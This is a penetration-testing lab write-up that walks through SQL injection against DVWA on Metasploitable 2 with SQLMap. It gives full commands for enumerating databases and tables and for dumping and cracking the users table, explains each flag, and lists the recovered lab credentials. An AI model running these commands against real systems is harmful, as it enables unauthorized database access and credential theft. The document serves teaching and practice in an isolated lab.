# Penetration Testing Lab: SQL Injection on Metasploitable 2

This repository documents a step-by-step SQL Injection (SQLi) audit on a Metasploitable 2 environment running DVWA, utilizing **SQLMap** to progress through the different assessment phases.

---

## Section 1: Database Enumeration

This command is executed during the initial phase of the audit to enumerate the structured logical databases within the server and identify the target schema for the attack vector.

```bash
sqlmap -u "http://<TARGET_IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=<YOUR_PHPSESSID>; security=low" --dbs --flush-session --batch
```

### 📊 Enumeration Results (Databases):
The server processed the payload through the vulnerable parameter and returned the complete list of schemas managed by the DBMS:
*   `dvwa` (Target schema)
*   `information_schema`
*   `metasploit`
*   `mysql`
*   `owasp10`
*   `tikiwiki`
*   `tikiwiki195`

**Technical analysis of the parameters used:**
*   **`-u`**: Specifies the target URL hosting the vulnerable input parameter (`id=1`).
*   **`--cookie`**: Injects the HTTP Cookie header with valid session parameters. This is a mandatory requirement to interact with the protected resources behind the DVWA authentication mechanism.
*   **`security=low`**: Defines the environment variable state within the session to interact with the application's minimal mitigation level.
*   **`--dbs`**: Executes the schema enumeration directive available within the database management system.
*   **`--flush-session`**: Purges session files and previous audit states stored in the local buffer, forcing a clean scan in real time.
*   **`--batch`**: Suppresses console interaction. Forces SQLMap to make automated, logical default choices, accelerating the exploitation phase without manual pauses.

---

## Section 2: Table Enumeration

Once the active application schema (`dvwa`) was identified, the internal structure of the target was audited to list the corresponding data dictionaries and storage tables.

```bash
sqlmap -u "http://<TARGET_IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=<YOUR_PHPSESSID>; security=low" -D dvwa --tables --flush-session --batch
```

### 📊 Enumeration Results (Tables):
When querying the metadata of the `dvwa` schema, SQLMap identified the presence of the following entities:
*   `guestbook`
*   `users` (Critical entity selected for the data dump)

**Technical analysis of the parameters used:**
*   **`-D dvwa`**: Restricts the scope of the query to the specific database schema selected.
*   **`--tables`**: Executes the structural table enumeration directive associated with the active schema's data dictionary.
*   **`--flush-session`**: Invalidates the previous session cache to perform a direct query on the data dictionary in real time.
*   **`--batch`**: Automates responses to the query engine's requests during entity extraction.

---

## Section 3: Data Dumping & Exploitation

This is the final exfiltration phase of the assessment. After confirming the existence of the `users` entity, the record extraction directive and the cryptographic decryption of the stored access credentials are executed.

```bash
sqlmap -u "http://<TARGET_IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=<YOUR_PHPSESSID>; security=low" -D dvwa -T users --dump --flush-session --batch
```

### 🔑 Exfiltrated Credentials (Plain Text):
SQLMap successfully recovered the records from the selected columns. When processing the text strings corresponding to the passwords, the engine identified that they were stored as MD5 cryptographic hashes; automatically (managed by the batch directive), it invoked its built-in dictionary cracking module, recovering the original values in plain text:

*   **admin** -> `pinguino`
*   **gordonb** -> `abc123`
*   **1337** -> `charley`
*   **pablo** -> `letmein`
*   **smithy** -> `password`

**Technical analysis of the parameters used:**
*   **`-T users`**: Establishes the dump scope on the specific entity that stores the system credentials.
*   **`--dump`**: Executes the data exfiltration directive, extracting the records stored within the rows and columns of the active table. The engine processes the hashes and triggers the built-in dictionary/brute-force module for key recovery.
*   **`--flush-session`**: Forces direct synchronization of HTTP requests with the server database, avoiding the reading of locally cached historical dumps.
*   **`--batch`**: Automates the final exploitation workflow. Upon detecting MD5 cryptographic functions, the parameter autonomously confirms the use of the tool's default dictionary without requiring console intervention.

---
⚠️ *Disclaimer: This lab was performed strictly for educational purposes within an isolated, self-hosted laboratory environment.*
